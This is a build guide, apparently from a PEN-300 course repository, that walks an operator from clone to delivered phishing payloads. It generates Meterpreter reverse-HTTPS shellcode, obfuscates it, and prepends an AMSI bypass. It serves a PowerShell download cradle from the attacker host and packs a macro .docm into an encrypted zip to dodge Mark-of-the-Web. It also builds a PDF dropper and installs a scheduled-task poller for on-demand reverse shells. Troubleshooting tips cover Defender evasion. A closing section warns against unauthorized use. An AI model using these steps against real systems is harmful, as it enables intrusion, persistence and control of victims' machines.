# BUILD.md — End-to-End: Clone to Armed Payload

Walks the full pipeline: from a fresh clone of this repo to two fully usable
phishing payloads (`.docm` in an encrypted zip, `.pdf`) with a working C2,
tested against a lab target, and ready for delivery.

Component-level build notes live in each subdirectory's README. This file
is the operator's walkthrough that ties them together.

---

## Prerequisites

### On the Kali C2 box

```bash
sudo apt install -y apache2 mono-devel p7zip-full pandoc python3
sudo systemctl start apache2
```

Metasploit is assumed installed (Kali default).

### On a Windows dev box

- Windows 10/11 with Microsoft Word (2016 or later)
- .NET Framework 4.x (ships with Windows) — provides `csc.exe`
- Git Bash or WSL if you want to run the bash helpers
- A Windows lab VM for testing (Windows 10 21H2 or Server 2019 target,
  Defender enabled, SMBv1 off, no unusual hardening) — **do not test on a
  production system**

### Network

Kali must be reachable from the lab VM on TCP 80 (web root) and TCP 443
(Meterpreter handler). In the course lab this is the VPN; on a home lab this
is a bridged adapter.

---

## Step 1 — Set up the C2 web root and handler

### 1a. Web root layout

```bash
sudo mkdir -p /var/www/html
sudo chown -R www-data:www-data /var/www/html
sudo chmod 755 /var/www/html

# Placeholder decoy page (optional, for the URL to look normal if a target browses)
cat > /var/www/html/decoy.html <<'HTML'
<!doctype html><html><head><title>IT Portal</title></head>
<body><h1>Document Portal</h1>
<p>Please contact IT support for access.</p></body></html>
HTML

# Activate gate — start absent. Touch this to fire the on-demand callback.
# Do NOT create it yet.
```

### 1b. Start the Metasploit handler

Copy `shared/handler.rc` into Kali and edit the LHOST, LPORT, and
`HandlerSSLCert` path to match your environment.

```bash
# Generate a self-signed cert mimicking a benign domain (Mod 14.3.1)
mkdir -p ~/self_cert && cd ~/self_cert
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key \
    -days 365 -subj "/C=US/ST=TX/L=Houston/O=NASA/OU=JSC/CN=nasa.gov"
cat priv.key cert.crt > nasa.pem
cd -

# Edit handler.rc to point at ~/self_cert/nasa.pem
$EDITOR shared/handler.rc

# Launch
msfconsole -q -r shared/handler.rc
```

Verify: `msf6 > jobs` should show the handler running on 443.

---

## Step 2 — Generate `run.txt`

Follow `shared/run_txt_recipe.md`. Full command sequence:

```bash
cd /tmp
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<KALI_IP> LPORT=443 \
    EXITFUNC=thread -f ps1 -o raw.txt

# Cipher +5
python3 - <<'PY'
import re
data = open('raw.txt').read()
nums = re.findall(r'0x([0-9a-fA-F]{2})', data)
enc  = [ (int(n,16) + 5) & 0xFF for n in nums ]
with open('ciphered.txt','w') as f:
    f.write('[Byte[]] $buf = ' + ','.join(f'0x{b:02x}' for b in enc))
PY
```

Now build the full `run.txt` by concatenating, in this order:

1. AMSI bypass prefix (contents of `shared/activate_poller.ps1` lines
   between the two header comments — the `[Ref].Assembly.GetTypes()`
   block through the `Marshal::Copy` line)
2. `LookupFunc` function (Mod 8.2.3)
3. `getDelegateType` function (Mod 8.2.3)
4. Ciphered `$buf` from `ciphered.txt`
5. Decryption loop:
   ```powershell
   for ($i=0; $i -lt $buf.Length; $i++) {
       $buf[$i] = (($buf[$i] - 5) -band 0xFF)
   }
   ```
6. `VirtualAlloc` + `Marshal.Copy` + `CreateThread` + `WaitForSingleObject`
   (Mod 8.2.3)

Copy the assembled file to the web root:

```bash
sudo cp run.txt /var/www/html/run.txt
sudo chmod 644 /var/www/html/run.txt
```

**Verify from a lab browser:**
`http://<KALI_IP>/run.txt` should return the script as plaintext.

---

## Step 3 — Build the DOC vector

### 3a. Generate the docx body

On a box with pandoc:

```bash
cd doc
pandoc q4_invoice_body.md -o Q4_Invoice.docx
```

### 3b. Embed the macro in Word (manual — one step)

Word cannot be scripted to embed VBA reliably. Full steps in
`doc/README.md`; short version:

1. Open `Q4_Invoice.docx` in Word.
2. `Alt+F11` → Insert → Module.
3. Paste the entire contents of `doc/q4_invoice.vba`.
4. Edit the `strArg` string in `MyMacro` and the two persistence routines so
   `http://192.168.119.120/run.txt` points at your Kali IP.
5. File → Save As → **Word Macro-Enabled Document (\*.docm)** →
   `Q4_Invoice.docm`.
6. Close, reopen. Confirm the yellow **SECURITY WARNING — Macros have been
   disabled** banner appears. Click **Enable Content**. Verify no error.

### 3c. Replace the poller placeholder

The scheduled task body in `PersistScheduledTask` currently writes the string
`"(poller body — see shared/activate_poller.ps1)"`. Replace that with the
contents of `shared/activate_poller.ps1` before saving as `.docm`.

Easiest path: open `q4_invoice.vba` in a text editor, replace the placeholder
line with the poller body, then paste the updated file into Word. The polling
interval is controlled by the `/mo 5` flag in the `schtasks /create` command
— change it if you want a tighter or wider window.

### 3d. Package for delivery

```bash
# Password-protected zip — MoTW does not propagate through encrypted archives
7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm
```

`Q4_Invoice.zip` is your DOC vector, ready to attach to a phishing email.

---

## Step 4 — Build the PDF vector

### 4a. Compile the launcher

```bash
cd pdf

# On Windows:
csc /target:exe /platform:x64 /out:payload.exe payload.cs

# Or on Linux/WSL:
mcs -platform:x64 -out:payload.exe payload.cs
```

Edit the `encoded` string in `payload.cs` **before** compiling if your
`run.txt` URL is not `http://192.168.119.120/run.txt`. Regenerate the base64
with:

```powershell
$cmd = "iex((new-object system.net.webclient).downloadstring('http://YOUR_IP/run.txt'))"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

### 4b. Generate the PDF

```bash
python3 build_pdf_payload.py \
    --exe payload.exe \
    --out Q4_Invoice.pdf \
    --name "Q4_Invoice_Update.exe"
```

The `--name` is what the user sees in the "Open attachment?" prompt. Match
it to the pretext.

`Q4_Invoice.pdf` is your PDF vector, ready to attach directly to a phishing
email.

---

## Step 5 — Test on the lab VM

**Do this before any real delivery.** Both vectors.

### 5a. Test the DOC vector

1. Copy `Q4_Invoice.zip` to the lab VM.
2. Extract with 7-Zip using password `invoice2024`.
3. Verify the extracted `.docm` **does not** carry MoTW (right-click →
   Properties → Security should be blank, not "came from another computer").
4. Open the `.docm` in Word → click **Enable Content**.
5. Watch the handler — a Meterpreter session should open within ~10 seconds.

If no session:
- Check the web log on Kali: `sudo tail -f /var/log/apache2/access.log`
  — did the VM request `run.txt`?
- Check for a Defender alert on the VM
- Confirm WMI is reachable — `GetObject("winmgmts:")` requires the WMI
  service (running by default)

### 5b. Test the PDF vector

1. Copy `Q4_Invoice.pdf` to the lab VM.
2. Open in **Adobe Reader** (not Edge/Chrome — those don't run JS in PDFs).
3. Confirm the "Loading invoice viewer..." alert appears.
4. Confirm the "Open attachment?" prompt appears with the correct filename.
5. Click **Open**. Handler should catch a session.

If no session:
- Confirm Reader's JavaScript is enabled (Edit → Preferences → JavaScript →
  Enable Acrobat JavaScript)
- Confirm Windows did not quarantine `payload.exe` on extraction (check
  Defender's Protection History)

### 5c. Test persistence

After a successful shell from either vector:

1. Reboot the VM.
2. Log back in as the same user.
3. Wait 5–10 minutes (the poller runs every 5 minutes).
4. From Kali: `sudo touch /var/www/html/activate`
5. Within 5 minutes, a new Meterpreter session should open without any user
   action on the target.

This is the on-demand callback working as designed. Then:

```bash
sudo rm /var/www/html/activate   # silence — target goes dormant
```

### 5d. Test the callback gate

While the target is running the poller, verify that **no session fires**
when `/activate` is absent. Watch the handler for 10 minutes. You should
see nothing. This is the point of the gate — dormant unless you want it.

---

## Step 6 — Package and deliver

### Deliverable files

| File | Vector | Delivery |
|------|--------|----------|
| `Q4_Invoice.zip` | DOC | Attach to email — password in body |
| `Q4_Invoice.pdf` | PDF | Attach directly, or zip if gateway strips PDFs |

### Email pretext

Sample body for the DOC vector is in `doc/q4_invoice_body.md`. Adapt the
wording to your engagement's cover story. Same idea for the PDF pretext —
match the filename in the attachment prompt to the story.

---

## Step 7 — Operator workflow during engagement

```bash
# 1. Handler running (from Step 1b)
# 2. Deliver either vector via phishing
# 3. When user clicks, session opens — background it in msfconsole:
sessions -l
sessions -i <n>
background

# 4. Target is now under our control. Persistence is installed.
# 5. To re-establish later (after logoff, lock, or reboot):
sudo touch /var/www/html/activate
# wait up to 5 minutes
# when a session opens:
sudo rm /var/www/html/activate

# 6. Before engagement close, run cleanup on target:
sessions -i <n>
shell
powershell -exec bypass -File shared/cleanup.ps1
exit
```

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| Word blocks macro with no "Enable Content" | Office 2021/365 with macros disabled by policy | Use the PDF vector, or test against a target with macros enabled |
| `.docm` opens in Protected View | MoTW propagated through the zip | Re-zip with `7z -mhe=on`; confirm extracted file has no Zone.Identifier stream |
| PDF opens in browser, no JS | Chrome/Edge/Firefox built-in viewer | Set Adobe Reader as default for `.pdf` on the target |
| No session after "Enable Content" | PowerShell cradle failed (WMI blocked, network, DNS) | Check `sudo tail -f /var/log/apache2/access.log` — did the VM hit `/run.txt`? |
| No session from PDF | Defender caught `payload.exe` on extraction | Check Defender history; recompile `payload.exe` with AV bypass (Mod 11.5.2) |
| Handler catches session, then it dies | Stage encoded wrong or `EXITFUNC` not `thread` | Regenerate `run.txt` with `EXITFUNC=thread`; confirm `EnableStageEncoding true` in handler |
| `/activate` fires but no session | AMSI bypass failed, or Defender caught the runner | Disable AMSI manually on target shell to test; swap the AMSI bypass method |
| `csc` not found on Windows | PATH missing .NET Framework dir | Add `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` to PATH |

---

## What NOT to do

- Do not test against any system you do not own or do not have written
  authorization to test. Every command in this repo is one step removed from
  a crime in most jurisdictions.
- Do not push compiled artifacts (`payload.exe`, `Q4_Invoice.docm`,
  `Q4_Invoice.pdf`, `Q4_Invoice.zip`) to a public repo. The `.gitignore`
  in this repo blocks them; do not override it.
- Do not reuse the exact certificate, base64 cradle, or Caesar key across
  engagements. Regenerate per engagement — signatures get written.
- Do not leave `/activate` present on the C2 after an engagement. Remove
  it. Otherwise the target fires a shell every 5 minutes forever.

---

## Course cross-reference

| Step | PEN-300 Module |
|------|----------------|
| AMSI bypass in poller | Mod 12.3.1 |
| DOC vector macro | Mod 4.1.2 |
| De-chaining via WMI | Mod 11.8.2 |
| Emulator detection | Mod 11.6.1 |
| Ciphered shellcode | Mod 11.5.2 |
| Reflective shellcode runner | Mod 8.2.3 |
| PDF embedding + OpenAction | Mod 4-adjacent client-side (MSHTA/Jscript family) |
| Domain-frontable C2 (if needed) | Mod 14.6 |
| Certificate signing | Mod 14.3.1 |
| Stage encoding | Mod 11.4.1 |
